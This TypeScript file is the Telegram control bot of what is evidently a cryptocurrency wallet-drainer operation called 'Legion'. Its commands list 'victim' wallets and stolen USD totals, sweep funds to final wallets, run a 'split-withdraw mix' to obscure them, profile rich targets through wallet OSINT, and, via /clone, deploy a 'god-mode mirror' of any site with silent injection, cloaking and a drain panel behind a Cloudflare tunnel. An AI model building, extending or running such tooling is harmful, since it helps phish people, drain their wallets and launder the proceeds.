/**
 * Telegram control bot — remote ops via authorized chats (TELEGRAM_CHAT_IDS).
 * Commands: /status, /pause, /resume, /recent, /stats, /sweep, /swap, /mix, /clone
 */
import { Bot, type Context } from 'grammy'

import { formatSweepAllResult } from '@legion/core'

import { parseCloneCommandUrl, runCloneTunnelDeploy } from './lib/clone-tunnel-deploy.js'
import { formatMixAllResult, runMixNow } from './lib/mix-execution.js'
import {
  getExtractionQueueJobCounts,
  getExtractionQueueState,
} from './lib/extraction-queue.js'
import { runSweepNow } from './lib/sweep-queue.js'
import { fetchRecentDlqEntries } from './lib/bullmq-dlq.js'
import {
  getLastDrainTime,
  isSettlementPaused,
  setSettlementPaused,
} from './lib/settlement-pause.js'
import {
  queryLastSettledAt,
  queryRecentSettled,
  queryTodaySettledStats,
  queryVictimInfo,
  queryChainBreakdown,
  queryActiveRecentSessions,
} from './lib/signature-vault-queries.js'
import {
  formatHistoryTimestamp,
  formatSettlementAmount,
  querySettlementHistory,
  settlementStatusLabel,
  truncateWalletAddress,
  etherscanTxUrl,
} from './lib/settlement-history.js'
import { resolveTelegramChatIds } from './lib/telegram.js'
import { buildOsintReport } from './lib/osint-lookup.js'

let controlBot: Bot | null = null
let botStartPromise: Promise<void> | null = null
let botLastError: string | null = null
let botSkipReason: string | null = null

export type TelegramBotStatus = {
  configured: boolean
  running: boolean
  skipReason: string | null
  lastError: string | null
  authorizedChats: number
}

export function getTelegramBotStatus(): TelegramBotStatus {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  const chats = authorizedChatIds()
  return {
    configured: Boolean(token && chats.length > 0),
    running: controlBot != null && botLastError == null,
    skipReason: botSkipReason,
    lastError: botLastError,
    authorizedChats: chats.length,
  }
}

function shouldSkipTelegramBotInDev(): boolean {
  if (process.env['NODE_ENV'] !== 'development') return false
  const flag =
    process.env['TELEGRAM_BOT_SKIP_LOCAL']?.trim().toLowerCase() ??
    process.env['DISABLE_TELEGRAM_BOT']?.trim().toLowerCase()
  if (!flag) return false
  return flag === 'true' || flag === '1' || flag === 'yes'
}

function authorizedChatIds(): string[] {
  return resolveTelegramChatIds()
}

function isAuthorizedChat(chatId: number | undefined): boolean {
  if (chatId == null) return false
  const allowed = authorizedChatIds()
  if (allowed.length === 0) return false
  return allowed.includes(String(chatId))
}

function truncateWallet(addr: string): string {
  const a = addr.trim()
  if (a.length <= 14) return a
  return `${a.slice(0, 8)}…${a.slice(-4)}`
}

function formatUsd(n: number): string {
  if (!Number.isFinite(n)) return '0'
  return n >= 1_000_000
    ? `$${(n / 1_000_000).toFixed(2)}M`
    : n >= 1_000
      ? `$${(n / 1_000).toFixed(2)}K`
      : `$${n.toFixed(2)}`
}

async function replyUnauthorized(ctx: Context): Promise<void> {
  await ctx.reply('⛔ Unauthorized chat. Configure TELEGRAM_CHAT_IDS for this chat.')
}

async function buildStatusMessage(): Promise<string> {
  const paused = await isSettlementPaused()
  const queueState = getExtractionQueueState()
  const counts = await getExtractionQueueJobCounts()
  const lastDrain =
    (await getLastDrainTime()) ?? (await queryLastSettledAt()) ?? 'none'

  const lines = [
    '📡 <b>LEGION STATUS</b>',
    '━━━━━━━━━━━━━━━━',
    `⏸️ <b>Settlement ingress:</b> ${paused ? 'PAUSED' : 'ACTIVE'}`,
    `🗄️ <b>Redis:</b> ${queueState.redis_operational ? 'up' : 'down/degraded'}`,
    `📬 <b>Memory queue fallback:</b> ${queueState.memory_pending} job(s)`,
  ]

  if (counts) {
    lines.push(
      `📋 <b>Extraction queue:</b> ${counts.pending} pending (waiting ${counts.waiting}, active ${counts.active}, delayed ${counts.delayed})`,
      `⚠️ <b>Failed jobs:</b> ${counts.failed}`,
    )
  } else {
    lines.push('📋 <b>Extraction queue:</b> unavailable (Redis off)')
  }

  lines.push(`🕐 <b>Last settlement:</b> <code>${lastDrain}</code>`)
  lines.push(`✅ <b>API health:</b> listening`)
  return lines.join('\n')
}

async function handleStatus(ctx: Context): Promise<void> {
  await ctx.reply(await buildStatusMessage(), { parse_mode: 'HTML' })
}

async function handlePause(ctx: Context): Promise<void> {
  const ok = await setSettlementPaused(true)
  if (!ok) {
    await ctx.reply('❌ Could not set pause flag — Redis unavailable.')
    return
  }
  await ctx.reply(
    '⏸️ <b>Settlement paused.</b>\nNew <code>/api/signature-anchor</code> requests will be rejected until /resume.',
    { parse_mode: 'HTML' },
  )
}

async function handleResume(ctx: Context): Promise<void> {
  const ok = await setSettlementPaused(false)
  if (!ok) {
    await ctx.reply('❌ Could not clear pause flag — Redis unavailable.')
    return
  }
  await ctx.reply('▶️ <b>Settlement resumed.</b> Signature-anchor ingress is open.', {
    parse_mode: 'HTML',
  })
}

async function handleRecent(ctx: Context): Promise<void> {
  const text = ctx.message?.text ?? ''
  const parts = text.trim().split(/\s+/)
  const nRaw = parts[1] != null ? Number.parseInt(parts[1], 10) : 5
  const limit = Number.isFinite(nRaw) && nRaw > 0 ? nRaw : 5

  const rows = await queryRecentSettled(limit)
  if (rows.length === 0) {
    await ctx.reply('📭 No settled signatures found in vault.')
    return
  }

  const lines = [
    `📜 <b>RECENT SETTLEMENTS (${rows.length})</b>`,
    '━━━━━━━━━━━━━━━━',
  ]
  for (const row of rows) {
    const usd = formatUsd(Number(row.scout_value_usd ?? '0'))
    const chain = row.chain_id ?? row.protocol ?? '—'
    lines.push(
      `• <code>${truncateWallet(row.wallet_address)}</code> — ${usd} — ${chain} — ${row.created_at || '—'}`,
    )
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

async function handleHistory(ctx: Context): Promise<void> {
  const text = ctx.message?.text ?? ''
  const parts = text.trim().split(/\s+/)
  const nRaw = parts[1] != null ? Number.parseInt(parts[1], 10) : 5
  const limit = Number.isFinite(nRaw) && nRaw > 0 ? Math.min(nRaw, 50) : 5

  const rows = await querySettlementHistory(limit)
  if (rows.length === 0) {
    await ctx.reply('📭 No settlement history found.')
    return
  }

  const lines = ['📜 <b>Settlement History</b>', '']
  for (const row of rows) {
    const ts = formatHistoryTimestamp(row.settlement_timestamp ?? row.created_at)
    const chain = row.chain_family ?? row.chain_id ?? '—'
    const amount = formatSettlementAmount(row.amount, row.token_address, row.chain_family)
    const status = settlementStatusLabel(row.status)
    let line = `${ts} | ${chain} | ${amount} | ${status}`
    if (row.tx_hash) {
      const explorer = etherscanTxUrl(row.tx_hash, row.chain_id)
      const txLabel = truncateWalletAddress(row.tx_hash)
      line += explorer ? ` | tx: <a href="${explorer}">${txLabel}</a>` : ` | tx: <code>${txLabel}</code>`
    }
    if (row.status === 'failed' && row.error_message) {
      line += ` | ${row.error_message.slice(0, 80)}`
    }
    lines.push(line)
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

async function handleStatsToday(ctx: Context): Promise<void> {
  const stats = await queryTodaySettledStats()
  await ctx.reply(
    [
      '📈 <b>STATS TODAY (IST)</b>',
      '━━━━━━━━━━━━━━━━',
      `✅ <b>Settled count:</b> ${stats.count}`,
      `💵 <b>Total scout USD:</b> ${formatUsd(stats.total_usd)}`,
    ].join('\n'),
    { parse_mode: 'HTML' },
  )
}

// ─── New Phase 7 handlers ─────────────────────────────────────────────────────

async function handleVictim(ctx: Context): Promise<void> {
  const text = ctx.message?.text ?? ''
  const parts = text.trim().split(/\s+/)
  const wallet = parts[1] ?? ''
  if (!wallet || !/^0x[0-9a-fA-F]{2,40}$/.test(wallet)) {
    await ctx.reply(
      '👤 <b>Usage:</b> <code>/victim 0x1234…abcd</code>\nShows all signature records for that wallet.',
      { parse_mode: 'HTML' },
    )
    return
  }

  await ctx.reply(`⏳ Looking up <code>${wallet}</code>…`, { parse_mode: 'HTML' })
  const rows = await queryVictimInfo(wallet)

  if (rows.length === 0) {
    await ctx.reply(`📭 No records found for <code>${wallet}</code>.`, { parse_mode: 'HTML' })
    return
  }

  const totalUsd = rows.reduce((s, r) => s + (Number(r.scout_value_usd ?? '0') || 0), 0)
  const lines = [
    `👤 <b>VICTIM: ${wallet.slice(0, 10)}…${wallet.slice(-4)}</b>`,
    `💰 <b>Total value:</b> ${formatUsd(totalUsd)} across ${rows.length} record(s)`,
    '━━━━━━━━━━━━━━━━',
  ]
  for (const r of rows.slice(0, 8)) {
    const status = r.settlement_status ?? '?'
    const chain = r.chain_id ?? '?'
    const proto = r.protocol ?? '?'
    const usd = formatUsd(Number(r.scout_value_usd ?? '0'))
    const wallet_type = r.wallet_type ?? '?'
    lines.push(`• ${status} | ${chain} | ${proto} | ${usd} | ${wallet_type} | ${(r.created_at || '').slice(0, 10)}`)
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

async function handleChains(ctx: Context): Promise<void> {
  await ctx.reply('⏳ Building chain breakdown…', { parse_mode: 'HTML' })
  const rows = await queryChainBreakdown()

  if (rows.length === 0) {
    await ctx.reply('📭 No settled records by chain yet.', { parse_mode: 'HTML' })
    return
  }

  const totalUsd = rows.reduce((s, r) => s + r.total_usd, 0)
  const totalCount = rows.reduce((s, r) => s + r.count, 0)

  const lines = [
    '⛓️ <b>CHAINS BREAKDOWN (settled only)</b>',
    `📊 <b>Total:</b> ${totalCount} settlements | ${formatUsd(totalUsd)}`,
    '━━━━━━━━━━━━━━━━',
  ]
  for (const r of rows) {
    const pct = totalUsd > 0 ? `${((r.total_usd / totalUsd) * 100).toFixed(1)}%` : '0%'
    lines.push(`• <b>${r.chain_id}</b> — ${r.count}× | ${formatUsd(r.total_usd)} (${pct})`)
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

async function handleActive(ctx: Context): Promise<void> {
  const text = ctx.message?.text ?? ''
  const parts = text.trim().split(/\s+/)
  const minutes = Number(parts[1]) || 30

  await ctx.reply(`⏳ Fetching sessions in last ${minutes}min…`, { parse_mode: 'HTML' })
  const rows = await queryActiveRecentSessions(minutes)

  if (rows.length === 0) {
    await ctx.reply(`📭 No wallet sessions in last ${minutes} minutes.`, { parse_mode: 'HTML' })
    return
  }

  const lines = [
    `🔴 <b>ACTIVE SESSIONS (last ${minutes}min) — ${rows.length} entries</b>`,
    '━━━━━━━━━━━━━━━━',
  ]
  for (const r of rows) {
    const wt = truncateWallet(r.wallet_address)
    const status = r.settlement_status ?? '?'
    const chain = r.chain_id ?? '?'
    const wallet_type = r.wallet_type ?? '?'
    const usd = formatUsd(Number(r.scout_value_usd ?? '0'))
    const ts = (r.created_at || '').slice(11, 19)  // time portion only
    lines.push(`• <code>${wt}</code> ${status} | ${chain} | ${wallet_type} | ${usd} | ${ts}`)
  }
  await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
}

function registerCommands(bot: Bot): void {
  bot.command('status', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleStatus(ctx)
  })

  bot.command('pause', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handlePause(ctx)
  })

  bot.command('resume', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleResume(ctx)
  })

  bot.command('recent', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleRecent(ctx)
  })

  bot.command('history', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleHistory(ctx)
  })

  bot.command('stats', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const text = (ctx.message?.text ?? '').trim().toLowerCase()
    if (!text.includes('today')) {
      await ctx.reply('Usage: <code>/stats today</code>', { parse_mode: 'HTML' })
      return
    }
    await handleStatsToday(ctx)
  })

  bot.command('failed', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const entries = await fetchRecentDlqEntries(10)
    if (entries.length === 0) {
      await ctx.reply('✅ No dead-letter jobs in the last 7 days.', { parse_mode: 'HTML' })
      return
    }
    const lines = [
      '💀 <b>FAILED JOBS (DLQ)</b>',
      '━━━━━━━━━━━━━━━━',
      ...entries.map(
        (e, i) =>
          `${i + 1}. <b>${e.queue}</b> #${e.id}\n` +
          `   ${e.failed_at}\n` +
          `   <code>${e.error.slice(0, 120)}</code>`,
      ),
    ]
    await ctx.reply(lines.join('\n'), { parse_mode: 'HTML' })
  })

  bot.command('sweep', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply('⏳ Running vault sweep (gas reserve protected)…', { parse_mode: 'HTML' })
    try {
      const result = await runSweepNow()
      await ctx.reply(formatSweepAllResult(result), { parse_mode: 'HTML' })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Sweep failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('swap', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply('⏳ Running vault sweep (gas reserve protected)…', { parse_mode: 'HTML' })
    try {
      const result = await runSweepNow()
      await ctx.reply(formatSweepAllResult(result), { parse_mode: 'HTML' })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Sweep failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('mix', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply('⏳ Running split-withdraw mix (gas reserve protected)…', { parse_mode: 'HTML' })
    try {
      const outcome = await runMixNow({ force: true })
      if (outcome.mode === 'skipped') {
        await ctx.reply(`⏭ ${outcome.reason}`, { parse_mode: 'HTML' })
        return
      }
      await ctx.reply(formatMixAllResult(outcome.result), { parse_mode: 'HTML' })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Mix failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('clone', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)

    const targetUrl = parseCloneCommandUrl(ctx.message?.text)
    if (!targetUrl) {
      await ctx.reply(
        [
          '📋 <b>Usage:</b> <code>/clone https://example.com</code>',
          '',
          'Generates a god-mode mirror (silent inject, cloaking, drain panel),',
          'then exposes via Cloudflare tunnel or custom DNS when configured.',
          '',
          '⚠️ Bot host must have Docker + <code>cloudflared</code> (not Railway API container).',
        ].join('\n'),
        { parse_mode: 'HTML' },
      )
      return
    }

    await ctx.reply(
      [
        '⏳ Mirror deploy started — this may take several minutes.',
        `<code>${targetUrl}</code>`,
        '',
        'Steps: god-mode generate → docker compose → tunnel/DNS…',
      ].join('\n'),
      { parse_mode: 'HTML' },
    )

    void runCloneTunnelDeploy(targetUrl, { godMode: true })
      .then(async (result) => {
        if (result.ok === false) {
          await ctx.reply(
            `❌ <b>Mirror deploy failed</b>\n<code>${result.error.slice(0, 3500)}</code>`,
            { parse_mode: 'HTML' },
          )
          return
        }

        await ctx.reply(
          [
            '✅ <b>Mirror deployed</b>',
            `Mirror deployed at: <a href="${result.url}">${result.url}</a>`,
            `🔗 <b>Source:</b> <code>${targetUrl}</code>`,
          ].join('\n'),
          { parse_mode: 'HTML' },
        )
      })
      .catch(async (e) => {
        const detail = e instanceof Error ? e.message : String(e)
        await ctx.reply(`❌ Mirror deploy error: ${detail}`, { parse_mode: 'HTML' })
      })
  })

  // Phase 7: new operator commands
  bot.command('victim', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleVictim(ctx)
  })

  bot.command('chains', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleChains(ctx)
  })

  bot.command('today', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleStatsToday(ctx)
  })

  bot.command('active', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await handleActive(ctx)
  })

  bot.command('osint', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const text = ctx.message?.text ?? ''
    const parts = text.trim().split(/\s+/)
    const query = parts[1] ?? ''
    if (!query) {
      await ctx.reply(
        '🔍 <b>Usage:</b> <code>/osint 0x1234…abcd</code>\nGives: ETH balance, tx count, wallet age, Farcaster identity, linked wallets, web mentions.',
        { parse_mode: 'HTML' },
      )
      return
    }
    await ctx.reply('⏳ Running OSINT lookup…', { parse_mode: 'HTML' })
    try {
      const report = await buildOsintReport(query)
      await ctx.reply(report, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ OSINT failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('whale', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    const text = ctx.message?.text ?? ''
    const parts = text.trim().split(/\s+/)
    const query = parts[1] ?? ''
    if (!query) {
      await ctx.reply('🐋 <b>Usage:</b> <code>/whale 0x1234…abcd</code>', { parse_mode: 'HTML' })
      return
    }
    await ctx.reply('⏳ Running whale OSINT…', { parse_mode: 'HTML' })
    try {
      const report = await buildOsintReport(query)
      await ctx.reply(report, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } })
    } catch (e) {
      const detail = e instanceof Error ? e.message : String(e)
      await ctx.reply(`❌ Lookup failed: ${detail}`, { parse_mode: 'HTML' })
    }
  })

  bot.command('start', async (ctx) => {
    if (!isAuthorizedChat(ctx.chat?.id)) return replyUnauthorized(ctx)
    await ctx.reply(
      [
        '🛰️ <b>Legion control bot</b>',
        '/status — health, queue, last settlement',
        '/pause — reject new signature-anchor',
        '/resume — clear pause',
        '/recent [n] — last n settlements (signatures table)',
        '/history [n] — last n settlement attempts (settlement_history)',
        '/stats today — IST daily totals',
        '/today — shortcut for /stats today',
        '/victim &lt;wallet&gt; — all records for a specific wallet address',
        '/chains — settled breakdown by chain + USD share',
        '/active [min] — wallets with sessions in last N minutes (default 30)',
        '/sweep — transfer execution wallet surplus to FINAL_WALLET_* (keeps gas reserve)',
        '/swap — alias for /sweep',
        '/mix — split-withdraw mix from execution wallets (keeps gas reserve)',
        '/failed — last 10 BullMQ dead-letter jobs',
        '/clone &lt;url&gt; — authorized mirror + Cloudflare tunnel (Docker host required)',
        '/osint &lt;wallet&gt; — wallet OSINT: balance, age, Farcaster identity, linked wallets, web mentions',
        '/whale &lt;wallet&gt; — alias for /osint',
      ].join('\n'),
      { parse_mode: 'HTML' },
    )
  })
}

/**
 * Start grammY long-polling when TELEGRAM_BOT_TOKEN and authorized chat IDs are set.
 */
export async function startTelegramControlBot(): Promise<void> {
  const token = process.env['TELEGRAM_BOT_TOKEN']?.trim()
  if (!token) {
    botSkipReason = 'TELEGRAM_BOT_TOKEN unset'
    console.info('[TELEGRAM_BOT] TELEGRAM_BOT_TOKEN unset — control bot not started')
    return
  }

  const chats = authorizedChatIds()
  if (chats.length === 0) {
    botSkipReason = 'No TELEGRAM_CHAT_IDS configured'
    console.warn(
      '[TELEGRAM_BOT] No TELEGRAM_CHAT_IDS / TELEGRAM_CHAT_ID — control bot not started',
    )
    return
  }

  if (shouldSkipTelegramBotInDev()) {
    botSkipReason =
      'Skipped in development (TELEGRAM_BOT_SKIP_LOCAL or DISABLE_TELEGRAM_BOT=true). Stop Railway duplicate or use a separate bot token locally.'
    console.info(`[TELEGRAM_BOT] ${botSkipReason}`)
    return
  }

  if (controlBot) {
    console.info('[TELEGRAM_BOT] Already running')
    return
  }

  if (botStartPromise) {
    await botStartPromise
    return
  }

  const bot = new Bot(token)
  registerCommands(bot)
  controlBot = bot
  botSkipReason = null
  botLastError = null

  bot.catch((err) => {
    const msg =
      err.error instanceof Error ? err.error.message : String(err.error ?? err)
    botLastError = msg
    if (msg.includes('409') || msg.toLowerCase().includes('getupdates')) {
      console.warn(
        '[TELEGRAM_BOT] 409 conflict — another instance is polling this token (Railway + local?). Stop the local bot or set TELEGRAM_BOT_SKIP_LOCAL=true in .env',
      )
    } else {
      console.warn('[TELEGRAM_BOT] Handler error:', msg)
    }
  })

  botStartPromise = bot
    .start({
      onStart: () => {
        botLastError = null
        console.info(
          `[TELEGRAM_BOT] Listening — ${chats.length} authorized chat(s): ${chats.join(', ')}`,
        )
      },
    })
    .catch((err) => {
      const msg = err instanceof Error ? err.message : String(err)
      botLastError = msg
      controlBot = null
      if (msg.includes('409') || msg.toLowerCase().includes('getupdates')) {
        console.warn(
          '[TELEGRAM_BOT] Failed to start: 409 Conflict — only one bot instance may poll TELEGRAM_BOT_TOKEN. Close your local terminal running the API or set TELEGRAM_BOT_SKIP_LOCAL=true.',
        )
      } else {
        console.warn('[TELEGRAM_BOT] Failed to start:', msg)
      }
    })
    .finally(() => {
      botStartPromise = null
    })

  await botStartPromise
}

export async function stopTelegramControlBot(): Promise<void> {
  if (controlBot) {
    try {
      await controlBot.stop()
    } catch {
      /* ignore */
    }
    controlBot = null
  }
  botStartPromise = null
}
